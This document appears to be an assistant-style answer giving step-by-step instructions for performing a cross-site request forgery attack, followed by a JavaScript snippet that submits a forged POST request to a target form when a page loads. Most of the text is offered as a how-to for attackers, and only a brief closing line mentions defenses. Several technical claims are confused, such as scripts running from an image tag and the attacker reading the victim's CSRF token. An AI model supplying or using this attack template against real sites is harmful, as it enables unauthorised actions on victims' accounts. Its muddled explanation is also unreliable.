CSRF attacks exploit the trust that a website has in its users and the fact that most websites do not verify that the request came from the user who originally initiated the session. Here's a simplified example of how to perform a CSRF attack on a form using HTML and JavaScript:

1. Identify the vulnerable form and the associated endpoint.
2. Create a malicious website or email that includes an iframe or an image tag with a src attribute pointing to the attacker's server.
3. Inject a script into the malicious website or email that makes an XHR (XMLHttpRequest) or form submission to the targeted form's endpoint when the page is loaded or when the user interacts with the iframe or image.
4. The script should include the necessary CSRF tokens or cookies from the victim's browser to make the request appear as if it came from the legitimate user.

Here's a simple example of a malicious JavaScript code that makes a form submission using CSRF tokens:

```javascript
// Replace 'http://example.com/form' with the URL of the targeted form
// Replace 'CSRF_TOKEN' with the actual CSRF token obtained from the victim's browser

function makeRequest() {
  const xhr = new XMLHttpRequest();
  xhr.open('POST', 'http://example.com/form', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.setRequestHeader('CSRF-Token', 'CSRF_TOKEN');

  xhr.onload = function() {
    if (xhr.status === 200) {
      console.log('Form submitted successfully');
    } else {
      console.log('Form submission failed');
    }
  };

  xhr.send('data=value');
}

// Replace 'http://attacker.com/malicious.html' with the URL of the malicious website or email
document.addEventListener('DOMContentLoaded', function() {
  makeRequest();
});
```

This code makes a POST request to the targeted form's endpoint with the CSRF token obtained from the victim's browser. The attacker can include this code in an iframe or an image tag on their malicious website or email and trick the victim into loading the page or interacting with the iframe or image.

Keep in mind that this is a simplified example and real-world CSRF attacks can be more complex. To protect against CSRF attacks, websites should implement CSRF tokens or use other anti-CSRF techniques such as SameSite cookies or HTTP Referer checks.

